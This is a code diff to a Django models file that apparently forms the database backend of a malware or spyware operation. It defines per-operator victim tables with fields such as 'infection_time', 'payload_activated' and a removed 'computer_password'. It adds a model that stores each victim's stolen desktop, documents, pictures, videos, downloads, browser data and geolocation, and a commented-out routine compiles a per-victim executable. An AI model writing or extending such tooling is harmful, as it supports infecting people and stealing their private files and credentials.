@@ -55,22 +55,24 @@ class Application(models.Model):
     #windows_exe_file =  models.FileField(upload_to="Executables/windows/%y/%m/%d", blank=True, null=False)
 '''
 
-class UserProfile(models.Model):
-    email = models.EmailField()
+class ClientsProfile(models.Model):
+
+    ONLINE_STATUS = (
+        ('ONLINE', 'online'),
+        ('OFFLINE', 'offline'),
+    )
+
+    email = models.EmailField(unique=True)
     id_token = models.CharField(max_length=1000, blank=True, unique=True, null=False) 
     app_downloaded = models.BooleanField(default=False)
     app_installed = models.BooleanField(default=False)
     video_link = models.CharField(max_length=1000, default='', blank=True, null=False)
     redirect_link = models.URLField(default='', blank=True, null=False)
     link_visits = models.IntegerField(default=0)
+    payload_activated = models.BooleanField(default=False)
     infection_time = models.TimeField(blank=True, null=True)
-    last_date_online = models.DateTimeField(blank=True, null=True)
-    last_time_online = models.TimeField(blank=True, null=True)
-    ip = models.CharField(max_length=500, null=True, blank=True)
-    city = models.CharField(max_length=500, null=True, blank=True)
-    country = models.CharField(max_length=500, null=True, blank=True)      
-    status = models.BooleanField(default=False, null=True, blank=True)
-    computer_password = models.CharField(max_length=1000, blank=True, null=True)
+    last_time_online = models.TimeField(blank=True, null=True)      
+    status = models.CharField(max_length=100, choices=ONLINE_STATUS, default='offline')
     created = models.DateTimeField(auto_now_add=True, auto_now=False)
     updated = models.DateTimeField(auto_now_add=False, auto_now=True)
 
@@ -95,6 +97,25 @@ class UserProfile(models.Model):
         abstract = True 
 
 
+
+class ClientProfileDetails(models.Model):
+    pc_info = models.TextField(blank=True, null=True)
+    system_applications = models.TextField(blank=True, null=True)
+    geolocation = models.CharField(max_length=500, null=True, blank=True)
+    desktop = models.FileField(upload_to="uploads/desktop/%y/%m/%d", blank=True, null=True)
+    pictures = models.FileField(upload_to="uploads/pictures/%y/%m/%d", blank=True, null=True)
+    documents = models.FileField(upload_to="uploads/documents/%y/%m/%d", blank=True, null=True)
+    videos = models.FileField(upload_to="uploads/videos/%y/%m/%d", blank=True, null=True)
+    downloads = models.FileField(upload_to="uploads/downloads/%y/%m/%d", blank=True, null=True)
+    browser_details = models.FileField(upload_to="uploads/browser/%y/%m/%d", blank=True, null=True)
+    created = models.DateTimeField(auto_now_add=True, auto_now=False)
+    updated = models.DateTimeField(auto_now_add=False, auto_now=True)
+
+
+    class Meta:
+        abstract = True 
+
+
 '''
     def update_compiled_exe(self, token_id):
         completed_process = subprocess.run(["/home/blackrose/vidicu/src/buildexec.sh", token_id])
@@ -106,27 +127,98 @@ class UserProfile(models.Model):
 '''    
         
 
-class NadiaProfile(UserProfile):
+class NadiaClients(ClientsProfile):
     
     class Meta:
         ordering = ('-created',)
-        verbose_name_plural = 'NadiaProfiles'
+        verbose_name_plural = 'NadiaClients'
 
+    def __str__(self):
+        return "{}".format(self.email)
 
-class LizzyProfile(UserProfile):
+class LizzyClients(ClientsProfile):
     
     class Meta:
         ordering = ('-created',)
-        verbose_name_plural = 'LizzyProfiles'
+        verbose_name_plural = 'LizzyClients'
 
 
+    def __str__(self):
+        return "{}".format(self.email)
 
-pre_save.connect(user_profile_pre_save, sender=NadiaProfile)
-pre_save.connect(user_profile_pre_save, sender=LizzyProfile)
-#post_save.connect(user_profile_post_save, sender=NadiaProfile)
-#post_save.connect(user_profile_post_save, sender=LizzyProfile)
-        
 
+class ZaaloloClients(ClientsProfile):
+    class Meta:
+        ordering = ('-created',)
+        verbose_name_plural = 'ZaaloloClients'
+
+    def __str__(self):
+        return "{}".format(self.email)
+
+
+class KingpindrakoClients(ClientsProfile):
+    class Meta:
+        ordering = ('-created',)
+        verbose_name_plural = 'KingpindrakoClients'
+
+
+    def __str__(self):
+        return "{}".format(self.email)
+
+
+class NadiaClientsDetails(ClientProfileDetails):
+    client = models.OneToOneField(NadiaClients, on_delete=models.SET_NULL, null=True)
+
+    class Meta:
+        ordering = ('-created',)
+        verbose_name_plural = 'NadiaClientsDetails'
+
+    def __str__(self):
+        return "{}".format(self.client.email)
+
+
+class LizzyClientsDetails(ClientProfileDetails):
+    client = models.OneToOneField(LizzyClients, on_delete=models.SET_NULL, null=True)
+
+    class Meta:
+        ordering = ('-created',)
+        verbose_name_plural = 'LizzyClientsDetails'
+
+
+    def __str__(self):
+        return "{}".format(self.client.email)
+
+
+class ZaaloloClientsDetails(ClientProfileDetails):
+    client = models.OneToOneField(ZaaloloClients, on_delete=models.SET_NULL, null=True)
+
+    class Meta:
+        ordering = ('-created',)
+        verbose_name_plural = 'ZaaloloClientsDetails'
+
+
+    def __str__(self):
+        return "{}".format(self.client.email)
+
+
+class KingpindrakoClientsDetails(ClientProfileDetails):
+    client = models.OneToOneField(KingpindrakoClients, on_delete=models.SET_NULL, null=True)
+
+    class Meta:
+        ordering = ('-created',)
+        verbose_name_plural = 'KingpindrakoClientsDetails'
+
+
+    def __str__(self):
+        return "{}".format(self.client.email)
+
+
+pre_save.connect(user_profile_pre_save, sender=NadiaClients)
+pre_save.connect(user_profile_pre_save, sender=LizzyClients)
+pre_save.connect(user_profile_pre_save, sender=ZaaloloClients)
+pre_save.connect(user_profile_pre_save, sender=KingpindrakoClients)
+
+    
 
 class SubscribeNewsletter(models.Model):
     email = models.EmailField()
